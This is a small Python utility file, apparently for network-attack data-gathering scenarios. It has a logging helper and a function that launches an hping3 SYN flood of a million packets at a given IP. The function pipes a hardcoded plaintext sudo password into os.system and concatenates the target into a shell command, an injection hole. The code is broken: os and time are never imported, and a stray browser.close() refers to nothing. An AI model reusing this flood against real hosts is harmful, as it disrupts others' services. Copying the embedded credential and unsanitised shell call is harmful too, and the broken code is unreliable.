"""
This program is compilation of various utiliy functions that will be used by the scenarios for gathering data.
"""
import datetime

def timeKeeper(moduleName,textFile, mode):
    #This functions accepts the name of the module, the name of the text file to write to, and whether the method started or ended and adds the start and end timestamps to a textfile for logging

    currentTime = datetime.datetime.now()
    print(currentTime)    
    O = open(textFile, "a+")
    output = str(moduleName) + " " + mode + " " + str(currentTime) + "\n"
    O.write(str(output))
    O.close()
#end timeKeeper


def hPing3(ip):
#This attack method based upon the hping3 used in the IoT Commander code.  
#It has been modified to accept the IP of the target to allow for specification of the desired target.

    print("Starting Hping3 Attack Scenario")

    sudoPassword = 'N@chos4life' #password used to sign into computer being used to run IOTCommander.py
    command = 'hping3 -S -c 1000000 --faster ' + ip
    os.system('echo %s|sudo -S %s' % (sudoPassword, command))
    currentDT = datetime.datetime.now()

    time.sleep(60)

browser.close()

